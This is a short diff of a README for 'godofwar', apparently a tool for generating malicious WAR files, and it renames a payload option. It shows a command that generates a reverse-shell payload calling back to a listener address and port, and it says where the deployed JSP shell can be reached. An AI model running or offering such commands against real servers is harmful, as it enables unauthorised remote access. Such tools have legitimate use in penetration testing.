@@ -127,7 +127,7 @@ $ godofwar -l
 
 **Generate payload with LHOST and LPORT**
 ```
-godofwar -p reverse_shell_ui -H 192.168.100.10  -P 9911 -o puppy
+godofwar -p reverse_shell -H 192.168.100.10  -P 9911 -o puppy
 ```
 After deployment, you can visit your shell on (http://host:8080/puppy/puppy.jsp) 
 
